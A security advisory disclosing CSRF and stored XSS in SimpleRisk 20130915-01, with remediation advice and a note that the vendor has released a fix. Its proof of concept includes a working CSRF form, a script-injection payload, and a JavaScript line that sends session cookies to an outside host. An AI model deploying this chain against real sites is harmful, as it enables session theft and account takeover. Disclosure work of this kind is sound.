<p>4. *Vulnerability Description*</p>
<p>Cross-Site Request Forgery (CSRF) and Stored Cross-Site Scripting (XSS) have been discovered within SimpleRisk version 20130915-01 leading to complete account compromise. The CSRF vulnerability is used to deliver the XSS payload which accesses the authenticated user's session cookies and transmits them to a third-party domain under the attacker's control. Once the attacker has the user's session cookie, the attacker can authenticate to the application as the user.</p>
<p>5. *Vulnerable Packages*</p>
<p>Only version 20130915-01 was tested which was the latest version at the time of writing.</p>
<p>6. *Vendor Information, Solutions and Workarounds*</p>
<p>SimpleRisk released version 20130916-001 to address the issue.</p>
<p>7. *Credits*</p>
<p>These vulnerabilities were discovered by Ryan Dewhurst - <a href="http://www.randomstorm.com/">http://www.randomstorm.com/</a> - <a href="http://www.dewhurstsecurity.com/">http://www.dewhurstsecurity.com/</a></p>
<p>8. *Proof of Concept (PoC)*</p>
<p>8.1 *Cross-Site Request Forgery (CSRF)*</p>
<p>The following CSRF PoC submits a POST request to the prioritize_planning.php page with the XSS payload within the new_project parameter.</p>
<p>{% highlight html %}
  <html>
  <body>
    <form action="http://127.0.0.1/simplerisk/management/prioritize_planning.php" method="POST">
      <input type="hidden" name="new&#95;project" value="&lt;script&#32;src&#61;&#47;&#47;ethicalhack3r&#46;co&#46;uk&#47;files&#47;xss&#47;c&#46;j&gt;&lt;&#47;script&gt;" />
      <input type="hidden" name="add&#95;project" value="Add" />
      <input type="hidden" name="projects" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
{% endhighlight %}</p>
<p>8.2 *Stored Cross-Site Scripting (XSS)*</p>
<p>The prioritize_planning.php page accepts user supplied input via the new_project POST parameter and then later outputs that data to the page without first being sanitised or encoded. The following code was used to inject JavaScript into the application's back-end database.</p>
<p>Payload: &lt;script src=//ethicalhack3r.co.uk/files/xss/c.j&gt;&lt;/script&gt;<br />
Method: POST<br />
Parameter: new_project</p>
<p>The c.j JavaScript file contained the following code which sends the user's authenticated session cookie to a third-party domain:</p>
<p>document.write('&lt;img src=//ethicalhack3r.co.uk/srx=' + document.cookie + '&gt;');</p>
<p>9. *Remediation*</p>
<p>9.1 *Cross-Site Request Forgery (CSRF)*</p>
<p>Set per page anti-csrf tokens (nonces) which are submitted with requests and then validated by the server. Please refer to OWASP's CSRF Prevention Cheat Sheet for further information. [1]</p>
<p>9.2 *Cross-Site Scripting (XSS)*</p>
<p>Properly sanitise and encode user supplied input and output. Please refer to OWASP's XSS Prevention Cheat Sheet for further information. [2]</p>
<p>9.3 *Other Recommendations*</p>
<p>. Add the httponly flag to the session cookie so that JavaScript's document.cookie can not access it. [3]<br />
. Set the Content Security Policy (CSP) header to whitelist where JavaScript is allowed to be loaded from. [4]<br />
. Set the X-XSS-Protection header to ensure the browser's XSS filtering is enabled. (only works for reflected XSS) [5]</p>
